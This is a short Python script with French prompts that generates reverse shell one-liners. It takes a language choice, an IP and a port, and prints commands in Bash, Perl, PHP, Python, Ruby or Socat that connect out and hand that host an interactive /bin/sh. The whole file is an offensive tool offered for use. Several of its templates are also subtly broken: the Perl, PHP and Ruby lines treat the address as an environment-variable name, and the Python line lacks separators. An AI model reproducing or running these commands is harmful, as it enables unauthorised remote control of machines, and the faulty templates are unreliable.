print("""
        m    m m    m  mmmm  m    m mmmmmm m      m     
        #    # #  m"  #"   " #    # #      #      #     
        #mmmm# #m#    "#mmm  #mmmm# #mmmmm #      #     
        #    # #  #m      "# #    # #      #      #     
        #    # #   "m "mmm#" #    # #mmmmm #mmmmm #mmmmm
      
                  Générateur de reverse shell
      
                    [1] Bash      [2] Perl      
                    
                    [3] Php       [4] Python    
      
                    [5] Ruby      [6] Socat     
         
      """)
choix = input("En quelle language souaiter vous générer votre reverse shell ?: ")
ip = input("Quelle est votre ip ?: ")
port = input("Quelle port souaiter vous utilisé ?: ")

if choix == "1":
    print("\nbash -c 'exec bash -i &>/dev/tcp/"+ip+"/"+port+" <&1'\n")
    print("Votre reverse-shell a été générer !")

elif choix == "2":
    print("\nperl -e 'use Socket;$i='$ENV"+ip+"';$p=$ENV"+port+";socket(S,PF_INET,SOCK_STREAM,getprotobyname('tcp'));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,'>&S');open(STDOUT,'>&S');open(STDERR,'>&S');exec('/bin/sh -i');};'\n")
    print("Votre reverse-shell a été générer !")
    
elif choix == "3":
    print("\nphp -r '$sock=fsockopen(getenv('"+ip+"'),getenv('"+port+"'));exec('/bin/sh -i <&3 >&3 2>&3');'\n")
    print("Votre reverse-shell a été générer !")

elif choix == "4":
    print("\npython -c 'import sys,socket,os,pty;s=socket.socket()s.connect((os.getenv('"+ip+"'),int(os.getenv('"+port+"'))))[os.dup2(s.fileno(),fd) for fd in (0,1,2)]pty.spawn('/bin/sh')'\n")
    print("Votre reverse-shell a été générer !")

elif choix == "5":
    print("ruby -rsocket -e 'exit if fork;c=TCPSocket.new(ENV['"+ip+"'],ENV['"+port+"']);while(cmd=c.gets);IO.popen(cmd,'r'){|io|c.print io.read}end'\n")
    print("Votre reverse-shell a été générer !")

elif choix == "6":
    print("\nsocat tcp-connect:"+ip+":"+port+" exec:/bin/sh,pty,stderr,setsid,sigint,sane")
    print("Votre reverse-shell a été générer !")
